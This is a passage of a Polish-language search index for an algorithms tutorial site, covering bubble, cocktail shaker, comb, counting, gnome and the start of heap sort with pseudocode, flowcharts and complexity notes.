wykonuj:\n            3. Je\u017celi A[j] &gt; A[j + 1], to:\n                4. Zamie\u0144(A[j], A[j + 1])\n</code></pre>"},{"location":"algorithms/sorting/bubble-sort/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SortowanieB\u0105belkowe(n, A)\"]) --&gt; K0[i := 1]\n    K0 --&gt; K1{i &lt;= n}\n    K1 -- PRAWDA --&gt; K2p[j := 1]\n    K2p --&gt; K2{j &lt;= n - 1}\n    K2 -- PRAWDA --&gt; K3{\"A[j] &gt; A[j + 1]\"}\n    K3 -- PRAWDA --&gt; K4[\"Zamie\u0144(A[j], A[j + 1])\"]\n    K4 --&gt; K2i[j := j + 1]\n    K3 -- FA\u0141SZ --&gt; K2i\n    K2i --&gt; K2\n    K2 -- FA\u0141SZ --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ ------&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/sorting/bubble-sort/#rozwiazanie-2-optymalizacja-i","title":"Rozwi\u0105zanie 2: optymalizacja I","text":"<p>Nasz algorytm mo\u017cemy zoptymalizowa\u0107. Zauwa\u017cmy, \u017ce po ka\u017cdym przej\u015bciu wewn\u0119trznej p\u0119tli, tzn. po ka\u017cdym pe\u0142nym przej\u015bciu przez tablic\u0119, co najmniej jeden element znajdzie si\u0119 na w\u0142a\u015bciwym miejscu na ko\u0144cu tablicy. Oznacza to, \u017ce przy kolejnym przej\u015bciu nie musimy ju\u017c sprawdza\u0107 tego elementu, wi\u0119c mo\u017cemy zako\u0144czy\u0107 por\u00f3wnywanie par s\u0105siednich element\u00f3w o jedn\u0105 par\u0119 wcze\u015bniej! To znaczy, \u017ce na pocz\u0105tku przejdziemy przez wszystkie pary i ca\u0142\u0105 tablic\u0119, ale za drugim razem ju\u017c mo\u017cemy zatrzyma\u0107 si\u0119 na przedostatnim elemencie. Z kolei za trzecim razem mo\u017cemy zatrzyma\u0107 si\u0119 na trzeciej od ko\u0144ca warto\u015bci, itd. a\u017c posortujemy ca\u0142\u0105 tablic\u0119.</p> <p>Ta obserwacja pozwala nam skr\u00f3ci\u0107 wewn\u0119trzn\u0105 p\u0119tl\u0119 i uzale\u017cni\u0107 jej liczb\u0119 powt\u00f3rze\u0144 od pierwszej, zewn\u0119trznej p\u0119tli. Zamiast przechodzi\u0107 zawsze od \\(1\\) do \\(n-1\\), b\u0119dziemy przechodzi\u0107 do \\(n-i\\), tzn. za pierwszym razem przejdziemy do \\(n-1\\), ale ju\u017c za drugim do \\(n-2\\), a za trzecim do \\(n-3\\) itd.</p>"},{"location":"algorithms/sorting/bubble-sort/#pseudokod_1","title":"Pseudokod","text":"<pre><code>procedura SortowanieB\u0105belkowe(n, A):\n    1. Dla i := 1 do n, wykonuj:\n        2. Dla j := 1 do n - i, wykonuj:\n            3. Je\u017celi A[j] &gt; A[j+1], to:\n                4. Zamie\u0144(A[j], A[j+1])\n</code></pre>"},{"location":"algorithms/sorting/bubble-sort/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SortowanieB\u0105belkowe(n, A)\"]) --&gt; K0[i := 1]\n    K0 --&gt; K1{i &lt;= n}\n    K1 -- PRAWDA --&gt; K2p[j := 1]\n    K2p --&gt; K2{j &lt;= n - i}\n    K2 -- PRAWDA --&gt; K3{\"A[j] &gt; A[j + 1]\"}\n    K3 -- PRAWDA --&gt; K4[\"Zamie\u0144(A[j], A[j + 1])\"]\n    K4 --&gt; K2i[j := j + 1]\n    K3 -- FA\u0141SZ --&gt; K2i\n    K2i --&gt; K2\n    K2 -- FA\u0141SZ --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ ------&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/sorting/bubble-sort/#rozwiazanie-3-optymalizacja-ii","title":"Rozwi\u0105zanie 3: optymalizacja II","text":"<p>Kolejna optymalizacja polega na zaobserwowaniu, \u017ce mo\u017ce uda\u0107 nam si\u0119 posortowa\u0107 ca\u0142\u0105 tablic\u0119 szybciej ni\u017c zak\u0142adali\u015bmy. B\u0119dzie to oczywi\u015bcie zale\u017ca\u0142o od konkretnego u\u0142o\u017cenia element\u00f3w w tablicy. Kto wie, mo\u017ce nawet nam si\u0119 poszcz\u0119\u015bci i dostaniemy do posortowania ju\u017c posortowan\u0105 tablic\u0119? W ka\u017cdym razie, gdy tylko stwierdzimy, \u017ce tablica jest posortowana, mo\u017cemy zako\u0144czy\u0107 dzia\u0142anie algorytmu. Tylko jak stwierdzi\u0107, \u017ce tablica jest posortowana? To proste. Gdy przechodzimy przez kolejne pary s\u0105siednich element\u00f3w nale\u017cy zwr\u00f3ci\u0107 uwag\u0119 na to, czy dokonujemy jakiej\u015b zamiany. Je\u017celi w jednym przej\u015bciu nie dokonamy ju\u017c \u017cadnej zamiany, oznacza to, \u017ce tablica jest ju\u017c posortowana i mamy fajrant! </p> <p>Zrealizujemy to poprzez dodanie nowej zmiennej <code>posortowane</code>, w kt\u00f3rej zapami\u0119tamy, czy w danym przej\u015bciu dokonali\u015bmy jakiej\u015b zamiany. Ponadto, zmienimy zewn\u0119trzn\u0105 p\u0119tl\u0119 na warunkow\u0105 i b\u0119dziemy powtarza\u0107 operacje tak d\u0142ugo, a\u017c tablica zostanie posortowana.</p>"},{"location":"algorithms/sorting/bubble-sort/#pseudokod_2","title":"Pseudokod","text":"<pre><code>procedura SortowanieBabelkowe(n, A):\n    1. posortowane := FA\u0141SZ\n    2. i := 0\n    3. Dop\u00f3ki posortowane = FA\u0141SZ, wykonuj:\n        4. posortowane := PRAWDA\n        5. Dla j := 1 do n - i, wykonuj:\n            6. Je\u017celi A[j] &gt; A[j + 1], to:\n                7. Zamie\u0144(A[j], A[j + 1])\n                8. posortowane := Fa\u0142sz\n        9. i := i + 1\n</code></pre>"},{"location":"algorithms/sorting/bubble-sort/#schemat-blokowy_2","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SortowanieB\u0105belkowe(n, A)\"]) --&gt; K1[posortowane := FA\u0141SZ\n    i := 0]\n    K1 --&gt; K3{posortowane = FA\u0141SZ}\n    K3 -- PRAWDA --&gt; K4[posortowane := PRAWDA\n    j := 1]\n    K4 --&gt; K5{j &lt;= n - i}\n    K5 -- PRAWDA --&gt; K6{\"A[j] &gt; A[j + 1]\"}\n    K6 -- PRAWDA --&gt; K7[\"Zamie\u0144(A[j], A[j + 1])\n    posortowane := FA\u0141SZ\"]\n    K7 --&gt; K5i[j := j + 1]\n    K6 -- FA\u0141SZ --&gt; K5i\n    K5i --&gt; K5\n    K5 -- FA\u0141SZ --&gt; K9[i := i + 1]\n    K9 --&gt; K3\n    K3 -- FA\u0141SZ ------&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/sorting/bubble-sort/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n^2)\\) \u2014 kwadratowa</p> <p>Bez wzgl\u0119du na zastosowane optymalizacje, z\u0142o\u017cono\u015b\u0107 algorytmu sortowania b\u0105belkowego jest kwadratowa w pesymistycznym przypadku. Oczywi\u015bcie optymalizacje pozwalaj\u0105 nam zaoszcz\u0119dzi\u0107 na dok\u0142adnej liczbie operacji.</p> <p>Naj\u0142atwiej jest policzy\u0107 z\u0142o\u017cono\u015b\u0107 na najprostszej, naiwnej wersji algorytmu. Mamy dwie zagnie\u017cd\u017cone p\u0119tle, z kt\u00f3rych pierwsza wykonuje \\(n\\) a druga \\(n-1\\) przej\u015b\u0107. Przemna\u017camy te warto\u015bci przez siebie i otrzymujemy w przybli\u017ceniu \\(n^2\\).</p>"},{"location":"algorithms/sorting/bubble-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/sorting/bubble-sort/#c","title":"C++","text":""},{"location":"algorithms/sorting/bubble-sort/#python","title":"Python","text":""},{"location":"algorithms/sorting/bubble-sort/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/sorting/bubble-sort/#julia","title":"Julia","text":""},{"location":"algorithms/sorting/cocktail-shaker-sort/","title":"Sortowanie koktajlowe","text":"<p>Sortowanie koktajlowe, znane r\u00f3wnie\u017c jako sortowanie b\u0105belkowe z wstrz\u0105sami (ang. Cocktail Shaker Sort) lub sortowanie bidirectionalne, to odmiana algorytmu sortowania b\u0105belkowego. Podobnie jak sortowanie b\u0105belkowe, sortowanie koktajlowe jest prostym algorytmem, ale niezbyt wydajnym dla du\u017cych zbior\u00f3w danych.</p> <p>Algorytm sortowania koktajlowego r\u00f3\u017cni si\u0119 od sortowania b\u0105belkowego tym, \u017ce przegl\u0105da list\u0119 w obu kierunkach. Oznacza to, \u017ce podczas jednego przej\u015bcia lista jest przegl\u0105dana od pocz\u0105tku do ko\u0144ca, a nast\u0119pnie od ko\u0144ca do pocz\u0105tku. Proces ten powtarza si\u0119, a\u017c do momentu, gdy ca\u0142a zostanie jest posortowana.</p> <p>Algorytm sortowania koktajlowego opiera si\u0119 na nast\u0119puj\u0105cych krokach:</p> <ul> <li>Przegl\u0105danie listy: przegl\u0105damy list\u0119 od pocz\u0105tku do ko\u0144ca, por\u00f3wnuj\u0105c s\u0105siednie elementy. Je\u017celi s\u0105 w niew\u0142a\u015bciwej kolejno\u015bci, zamieniamy je miejscami.</li> <li>Przegl\u0105danie listy w drug\u0105 stron\u0119: teraz przegl\u0105damy list\u0119 od ko\u0144ca do pocz\u0105tku, ponownie por\u00f3wnuj\u0105c s\u0105siednie elementy i zamieniaj\u0105c je miejscami, je\u015bli s\u0105 w niew\u0142a\u015bciwej kolejno\u015bci.</li> <li>Powtarzanie: powtarzamy powy\u017csze kroki, a\u017c ca\u0142a lista b\u0119dzie posortowana.</li> </ul> <p>Poni\u017cej znajdziesz animacj\u0119 przedstawiaj\u0105c\u0105 ide\u0119 omawianego algorytmu.</p>"},{"location":"algorithms/sorting/cocktail-shaker-sort/#animacja","title":"Animacja","text":"<p>Sortowanie koktajlowe</p>"},{"location":"algorithms/sorting/cocktail-shaker-sort/#rozwiazanie","title":"Rozwi\u0105zanie","text":""},{"location":"algorithms/sorting/cocktail-shaker-sort/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura SortowanieKoktajlowe(n, A):\n    1. Od i := 1 do n div 2, wykonuj:\n        2. Od j := i do n - i, wykonuj:\n            3. Je\u017celi A[j] &gt; A[j + 1], to:\n                4. Zamie\u0144(A[j], A[j + 1])\n        5. Od j := n - i w d\u00f3\u0142 do i + 1, wykonuj:\n            6. Je\u017celi A[j] &lt; A[j - 1], to:\n                7. Zamie\u0144(A[j], A[j - 1]\n</code></pre> <p>Info</p> <p>div oznacza dzielenie ca\u0142kowite</p>"},{"location":"algorithms/sorting/cocktail-shaker-sort/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SortowanieKoktajlowe(n, A)\"]) --&gt; K0[i := 1]\n    K0 --&gt; K1{i &lt;= n div 2}\n    K1 -- PRAWDA --&gt; K2p[j := i]\n    K2p --&gt; K2{j &lt;= n - i}\n    K2 -- PRAWDA --&gt; K3{\"A[j] &gt; A[j + 1]\"}\n    K3 -- PRAWDA --&gt; K4[\"Zamie\u0144(A[j], A[j + 1])\"]\n    K3 -- FA\u0141SZ --&gt; K2i[j := j + 1]\n    K4 --&gt; K2i\n    K2i --&gt; K2\n    K2 --&gt; K5p[j := n - i]\n    K5p --&gt; K5{j &gt;= i + 1}\n    K5 -- PRAWDA --&gt; K6{\"A[j] &lt; A[j - 1]\"}\n    K6 -- PRAWDA --&gt; K7[\"Zamie\u0144(A[j], A[j - 1])\"]\n    K6 -- FA\u0141SZ --&gt; K5i[j := j - 1]\n    K7 --&gt; K5i\n    K5i --&gt; K5\n    K5 -- FA\u0141SZ --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ --------&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/sorting/cocktail-shaker-sort/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Podobnie jak sortowanie b\u0105belkowe, sortowanie koktajlowe ma z\u0142o\u017cono\u015b\u0107 obliczeniow\u0105 \\(O(n^2)\\) zar\u00f3wno w przypadku \u015brednim, jak i najgorszym. Wynika to z przegl\u0105dania ca\u0142ej listy dla ka\u017cdego elementu.</p>"},{"location":"algorithms/sorting/cocktail-shaker-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/sorting/cocktail-shaker-sort/#c","title":"C++","text":""},{"location":"algorithms/sorting/cocktail-shaker-sort/#python","title":"Python","text":""},{"location":"algorithms/sorting/cocktail-shaker-sort/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/sorting/comb-sort/","title":"Sortowanie grzebieniowe","text":"<p>Sortowanie grzebieniowe (ang. Comb Sort) to algorytm sortuj\u0105cy, kt\u00f3ry jest ulepszon\u0105 wersj\u0105 sortowania b\u0105belkowego. Podczas gdy sortowanie b\u0105belkowe zawsze por\u00f3wnuje s\u0105siednie elementy, sortowanie grzebieniowe eliminuje narastaj\u0105ce \u017c\u00f3\u0142wie, czyli ma\u0142e warto\u015bci ko\u0144ca listy, kt\u00f3re musz\u0105 by\u0107 przesuni\u0119te na pocz\u0105tek listy. Dzia\u0142a on poprzez por\u00f3wnywanie element\u00f3w oddzielonych przez okre\u015blony \"rozst\u0119p\", kt\u00f3ry jest na pocz\u0105tku du\u017cy, a nast\u0119pnie maleje.</p> <p>Algorytm sortowania grzebieniowego dzia\u0142a poprzez por\u00f3wnywanie element\u00f3w oddzielonych przez okre\u015blony \"rozst\u0119p\". W pocz\u0105tkowych fazach sortowania, \"rozst\u0119p\" jest do\u015b\u0107 du\u017cy i maleje w ka\u017cdej iteracji. W ko\u0144cu \"rozst\u0119p\" wynosi \\(1\\), co czyni algorytm podobnym do sortowania b\u0105belkowego. Oto podstawowe kroki algorytmu:</p> <ul> <li>Ustal \"rozst\u0119p\": na pocz\u0105tku \"rozst\u0119p\" jest ustalany na du\u017c\u0105 warto\u015b\u0107, zwykle r\u00f3wn\u0105 d\u0142ugo\u015bci listy. Zwykle jest on skracany o oko\u0142o \\(1.3\\) w ka\u017cdej iteracji, a\u017c osi\u0105gnie warto\u015b\u0107 \\(1\\).</li> <li>Por\u00f3wnaj elementy i zamie\u0144 je miejscami: por\u00f3wnuj elementy oddzielone \"rozst\u0119pem\" i zamieniaj je miejscami, je\u015bli s\u0105 w niew\u0142a\u015bciwej kolejno\u015bci.</li> <li>Zmniejsz \"rozst\u0119p\" i powt\u00f3rz: zmniejsz \"rozst\u0119p\" o okre\u015blony wsp\u00f3\u0142czynnik (zazwyczaj o \\(1.3\\)) i powt\u00f3rz krok drugi. Proces ten kontynuowany jest a\u017c \"rozst\u0119p\" osi\u0105gnie warto\u015b\u0107 \\(1\\) i lista zostanie posortowana.</li> </ul> <p>Poni\u017cej znajdziesz animacj\u0119 przedstawiaj\u0105c\u0105 ide\u0119 omawianego algorytmu.</p>"},{"location":"algorithms/sorting/comb-sort/#animacja-1","title":"Animacja 1","text":"<p>Sortowanie grzebieniowe</p>"},{"location":"algorithms/sorting/comb-sort/#animacja-2","title":"Animacja 2","text":"<p>Animacja sortowania grzebieniowego</p>"},{"location":"algorithms/sorting/comb-sort/#rozwiazanie","title":"Rozwi\u0105zanie","text":""},{"location":"algorithms/sorting/comb-sort/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura SortowanieGrzebieniowe(n, A):\n    1. przerwa := n\n    2. zm := 1.3\n    3. posortowana := FA\u0141SZ\n    4. Dop\u00f3ki posortowana = FA\u0141SZ, wykonuj:\n        5. przerwa := przerwa div zm\n        6. Je\u017celi przerwa &lt;= 1, to:\n            7. przerwa := 1\n            8. posortowana := PRAWDA\n        9. i := 1\n        10. Dop\u00f3ki i + przerwa &lt; n, wykonuj:\n            11. Je\u017celi A[i] &gt; A[i + przerwa], to:\n                12. Zamie\u0144(A[i], A[i + przerwa])\n                13. posortowana := FA\u0141SZ\n            14. i := i + 1\n</code></pre>"},{"location":"algorithms/sorting/comb-sort/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SortowanieGrzebieniowe(n, A)\"]) --&gt; K1[przerwa := n\n    zm := 1.3\n    posortowana := FA\u0141SZ]\n    K1 --&gt; K4{posortowana = FA\u0141SZ}\n    K4 -- PRAWDA --&gt; K5[przerwa := przerwa div zm]\n    K5 --&gt; K6{przerwa &lt;= 1}\n    K6 -- PRAWDA --&gt; K7[przerwa := 1\n    posortowana := PRAWDA]\n    K6 -- FA\u0141SZ --&gt; K9[i := 1]\n    K7 --&gt; K9\n    K9 --&gt; K10{i + przerwa &lt; n}\n    K10 -- PRAWDA --&gt; K11{\"A[i] &gt; A[i + przerwa]\"}\n    K11 -- PRAWDA --&gt; K12[\"Zamie\u0144(A[i], A[i + przerwa])\n    posortowana := FA\u0141SZ\"]\n    K11 -- FA\u0141SZ --&gt; K14[i := i + 1]\n    K12 --&gt; K14\n    K14 --&gt; K10\n    K10 -- FA\u0141SZ --&gt; K4\n    K4 -- FA\u0141SZ ------&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/sorting/comb-sort/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Sortowanie grzebieniowe ma \u015bredni\u0105 i najgorsz\u0105 z\u0142o\u017cono\u015b\u0107 obliczeniow\u0105 \\(O(n^2)\\), ale dla list prawie posortowanych z\u0142o\u017cono\u015b\u0107 ta mo\u017ce zbli\u017ca\u0107 si\u0119 do \\(O(n\\log{n})\\).</p>"},{"location":"algorithms/sorting/comb-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/sorting/comb-sort/#c","title":"C++","text":""},{"location":"algorithms/sorting/comb-sort/#python","title":"Python","text":""},{"location":"algorithms/sorting/comb-sort/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/sorting/counting-sort/","title":"Sortowanie przez zliczanie","text":"<p>Masz nietypowe hobby: zbierasz kamyki z liczbami. Dok\u0142adnie, niekt\u00f3re kamyki maj\u0105 wzory, kt\u00f3re przypominaj\u0105 liczby. Uda\u0142o Ci si\u0119 zebra\u0107 do\u015b\u0107 du\u017c\u0105 kolekcj\u0119 z warto\u015bciami rozci\u0105gaj\u0105cymi si\u0119 od \\(1\\) do \\(100\\). Niestety, p\u00f3\u0142ka na kt\u00f3rej trzyma\u0142e\u015b swoje kamyki, skrupulatnie u\u0142o\u017cone wzgl\u0119dem swoich warto\u015bci, nie wytrzyma\u0142a i za\u0142ama\u0142a si\u0119 pod ci\u0119\u017carem Twojej kolekcji. W efekcie wszystkie kamyki spad\u0142y na pod\u0142og\u0119 i trzeba je ponownie uporz\u0105dkowa\u0107. Zabierasz si\u0119 wi\u0119c do pracy. W twojej kolekcji jest wiele kamyk\u00f3w z takimi samymi liczbami, postanawiasz wi\u0119c podzieli\u0107 je na osobne kupki. Przegl\u0105dasz kamyki jeden po drugim i odk\u0142adasz je na w\u0142a\u015bciw\u0105 kupk\u0119, razem z innymi kamykami z tak\u0105 sam\u0105 liczb\u0105. Po godzinie pracy masz ju\u017c kilkadziesi\u0105t kupek z kamykami o tych samych warto\u015bciach, pozosta\u0142o je prze\u0142o\u017cy\u0107 na now\u0105, bardziej wytrzyma\u0142\u0105 p\u00f3\u0142k\u0119. Najpierw uk\u0142adasz wszystkie kamyki z liczb\u0105 jeden. Nast\u0119pnie uk\u0142adasz te z liczb\u0105 dwa. Teraz przysz\u0142a pora na trzeci\u0105 kupk\u0119: kamyki z liczb\u0105 pi\u0119\u0107 (niestety, liczb trzy i cztery nie ma w Twojej kolekcji). Tak uk\u0142adasz swoje kamyki, kupka po kupce przek\u0142adaj\u0105c je na p\u00f3\u0142k\u0119. W ten spos\u00f3b zastosowa\u0142e\u015b algorytm sortowania przez zliczanie</p> <p>Warning</p> <p>W tym algorytmie bardzo wa\u017cne jest, by zna\u0107 zakres warto\u015bci, kt\u00f3re b\u0119dziemy sortowa\u0107. Za\u0142o\u017cymy, \u017ce b\u0119dziemy sortowa\u0107 warto\u015bci od \\(0\\) do \\(m\\), a samo \\(m\\) b\u0119dzie warto\u015bci\u0105 podan\u0105 w danych wej\u015bciowych do naszego algorytmu.</p> <p>Poni\u017cej znajdziesz animacj\u0119 przedstawiaj\u0105c\u0105 ide\u0119 omawianego algorytmu.</p>"},{"location":"algorithms/sorting/counting-sort/#animacja","title":"Animacja","text":"<p>https://www.cs.usfca.edu/~galles/visualization/CountingSort.html</p>"},{"location":"algorithms/sorting/counting-sort/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Sortowanie przez zliczanie sk\u0142ada si\u0119 z dw\u00f3ch faz: fazy zliczania i fazy sortowania. Na pocz\u0105tku potrzebujemy stworzy\u0107 miejsce, w kt\u00f3rym b\u0119dziemy zlicza\u0107 liczebno\u015bci poszczeg\u00f3lnych warto\u015bci z tablicy. Tworzymy wi\u0119c now\u0105 tablic\u0119, tablic\u0119 licznik\u00f3w, kt\u00f3r\u0105 na pocz\u0105tku wype\u0142nimy samymi zerami. Potrzebujemy mie\u0107 po jednym liczniku na ka\u017cd\u0105 z mo\u017cliwych warto\u015bci od \\(1\\) do \\(m\\).</p> <p>Nast\u0119pnie przechodzimy przez kolejne elementy naszej tablicy i zwi\u0119kszamy licznik dla ka\u017cdej napotkanej warto\u015bci. Po zliczeniu wszystkich element\u00f3w pozosta\u0142o nam je ponownie u\u0142o\u017cy\u0107 w tablicy, teraz ju\u017c we w\u0142a\u015bciwej kolejno\u015bci. Przechodzimy wi\u0119c przez tablic\u0119 licznik\u00f3w i zapisujemy elementy do naszej tablicy \\(A\\). Dan\u0105 warto\u015b\u0107 zapisujemy tyle razy, ile wskazuje jej licznik.</p>"},{"location":"algorithms/sorting/counting-sort/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura SortowaniePrzezZliczanie(A, n, m):\n    1. liczniki := tablica [0..m] wype\u0142niona zerami\n    2. Od i := 1 do n, wykonuj:\n        3. liczniki[A[i]] := liczniki[A[i]] + 1\n\n    4. pozycja := 1\n    5. Od i := 1 do m, wykonuj:\n        6. Od j := 1 do liczniki[i], wykonuj:\n            7. A[pozycja] := i\n            8. pozycja := pozycja + 1  \n\n    9. Zwr\u00f3c A\n</code></pre>"},{"location":"algorithms/sorting/counting-sort/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n+m)\\) \u2014 liniowa</p> <p>Mamy tutaj do czynienia z dwoma liniowymi przej\u015bciami. Najpierw przechodzimy raz przez ca\u0142\u0105 tablic\u0119, co daje nam \\(n\\) operacji. Nast\u0119pnie przechodzimy przez ca\u0142y zakres warto\u015bci z tablicy, co daje nam \\(m\\) operacji. Sumujemy i dostajemy z\u0142o\u017cono\u015b\u0107 liniow\u0105.</p>"},{"location":"algorithms/sorting/counting-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/sorting/counting-sort/#c","title":"C++","text":""},{"location":"algorithms/sorting/counting-sort/#python","title":"Python","text":""},{"location":"algorithms/sorting/counting-sort/#blockly","title":"Blockly","text":""},{"location":"algorithms/sorting/counting-sort/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/sorting/gnome-sort/","title":"Sortowanie gnoma","text":"<p>Wyobra\u017amy sobie gnoma, kt\u00f3ry zarz\u0105dza swoim ogr\u00f3dkiem, a konkretnie ustawia doniczki we w\u0142a\u015bciwej kolejno\u015bci. Doniczki u\u0142o\u017cone s\u0105 w rz\u0105dku od lewej do prawej. Gnom przechodzi od lewej do prawej wzd\u0142u\u017c rz\u0119du doniczek, uwa\u017cnie je obserwuj\u0105c. Gdy tylko zauwa\u017cy, \u017ce dwie s\u0105siednie doniczki s\u0105 niew\u0142a\u015bciwie u\u0142o\u017cone, zamienia je miejscami i cofa si\u0119 do poprzedniej doniczki. Gdy natomiast z doniczkami jest wszystko tak, jak nale\u017cy, to przechodzi do kolejnej doniczki. Gdy gnom dotrze do ko\u0144ca doniczek mo\u017ce spokojnie stwierdzi\u0107, \u017ce wszystkie s\u0105 u\u0142o\u017cone we w\u0142a\u015bciwym porz\u0105dku.</p> <p>Poni\u017cej znajdziesz animacj\u0119 przedstawiaj\u0105c\u0105 ide\u0119 omawianego algorytmu.</p>"},{"location":"algorithms/sorting/gnome-sort/#animacja-1","title":"Animacja 1","text":"<p>Sortowanie gnoma</p>"},{"location":"algorithms/sorting/gnome-sort/#animacja-2","title":"Animacja 2","text":"<p>Animacja sortowania gnoma</p>"},{"location":"algorithms/sorting/gnome-sort/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Zauwa\u017cmy, \u017ce gnom ma do dyspozycji nast\u0119puj\u0105ce operacje: </p> <ul> <li>por\u00f3wnaj dwie s\u0105siednie doniczki: obecn\u0105 z poprzedni\u0105,</li> <li>zamie\u0144 dwie s\u0105siednie doniczki: obecn\u0105 z poprzedni\u0105,</li> <li>id\u017a o jedn\u0105 doniczk\u0119 w prawo,</li> <li>id\u017a o jedn\u0105 doniczk\u0119 w lewo.</li> </ul> <p>Gnom zaczyna swoj\u0105 podr\u00f3\u017c od lewej strony, czyli od pierwszej doniczki, czy te\u017c od pierwszego elementu. Poniewa\u017c mo\u017ce wy\u0142\u0105cznie por\u00f3wnywa\u0107 obecny element z poprzednim, to gdy znajduje si\u0119 na samym pocz\u0105tku nie ma wielkiego wyboru i musi p\u00f3j\u015b\u0107 w prawo. Podobnie post\u0119puje, gdy zauwa\u017cy, \u017ce dwie s\u0105siednie doniczki s\u0105 u\u0142o\u017cone we w\u0142a\u015bciwym porz\u0105dku: przemieszcza si\u0119 w prawo. Kiedy w takim razie gnom powinien p\u00f3j\u015b\u0107 w lewo? Gdy napotka dwie s\u0105siednie doniczki, kt\u00f3re s\u0105 u\u0142o\u017cone w z\u0142ej kolejno\u015bci. W\u00f3wczas zamienia je miejscami i idzie w lewo. I to wszystko powtarzamy tak d\u0142ugo, a\u017c gnom wyjdzie poza rz\u0105d doniczek, czyli a\u017c jego pozycja b\u0119dzie wi\u0119ksza od liczby element\u00f3w (\\(n\\)).</p>"},{"location":"algorithms/sorting/gnome-sort/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura SortowanieGnoma(n, A):\n    1. i := 1\n    2. Dop\u00f3ki i &lt;= n, wykonuj:\n        3. Je\u017celi i = 1 lub A[i] &gt;= A[i - 1], to:\n            4. i := i + 1\n        5. W przeciwnym przypadku:\n            6. Zamie\u0144(A[i], A[i - 1])\n            7. i := i - 1\n</code></pre>"},{"location":"algorithms/sorting/gnome-sort/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SortowanieGnoma(n, A)\"]) --&gt; K1[i := 1]\n    K1 --&gt; K2{i &lt;= n}\n    K2 -- PRAWDA --&gt; K3{\"i = 1\n    lub\n    A[i] &gt;= A[i - 1]\"}\n    K3 -- PRAWDA --&gt; K4[i := i + 1]\n    K4 --&gt; K2\n    K3 -- FA\u0141SZ --&gt; K6[\"Zamie\u0144(A[i], A[i - 1])\n    i := i - 1\"]\n    K6 --&gt; K2\n    K2 -- FA\u0141SZ ---&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/sorting/gnome-sort/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n^2)\\) \u2014 kwadratowa</p> <p>Prze\u015bledzenie z\u0142o\u017cono\u015bci algorytmu sortowania gnoma mo\u017ce wydawa\u0107 si\u0119 nietrywialne, zauwa\u017cmy jednak, \u017ce algorytm ten jest bardzo podobny do algorytmu sortowania przez wstawianie. Tak w\u0142a\u015bciwie od wspomnianego algorytmu r\u00f3\u017cni si\u0119 jedynie dodatkowym \"poruszaniem si\u0119 w prawo\", nie mo\u017ce mie\u0107 wi\u0119c z\u0142o\u017cono\u015bci lepszej, ni\u017c tamten algorytm.</p>"},{"location":"algorithms/sorting/gnome-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/sorting/gnome-sort/#c","title":"C++","text":""},{"location":"algorithms/sorting/gnome-sort/#python","title":"Python","text":""},{"location":"algorithms/sorting/gnome-sort/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/sorting/heap-sort/","title":"Sortowanie przez kopcowanie","text":"<p>Sortowanie przez kopcowanie (ang. Heap Sort), to skuteczny algorytm sortuj\u0105cy, kt\u00f3ry u\u017cywa struktury danych zwanej kopcem binarnym. Algorytm ten wykorzystuje w\u0142asno\u015b\u0107 kopca binarnego, kt\u00f3ra m\u00f3wi, \u017ce warto\u015b\u0107 w ka\u017cdym w\u0119\u017ale jest wi\u0119ksza (lub mniejsza, w zale\u017cno\u015bci od typu kopca) od warto\u015bci w jego w\u0119z\u0142ach-dzieciach.</p> <p>Algorytm sortowania przez kopcowanie sk\u0142ada si\u0119 z dw\u00f3ch g\u0142\u00f3wnych etap\u00f3w:</p> <ul> <li>Budowanie kopca: najpierw przekszta\u0142camy list\u0119 nieposortowanych element\u00f3w w kopiec binarny. Mo\u017ce to by\u0107 kopiec maksymalny, gdzie klucz ka\u017cdego rodzica jest wi\u0119kszy lub r\u00f3wny kluczom jego dzieci, lub kopiec minimalny, gdzie klucz 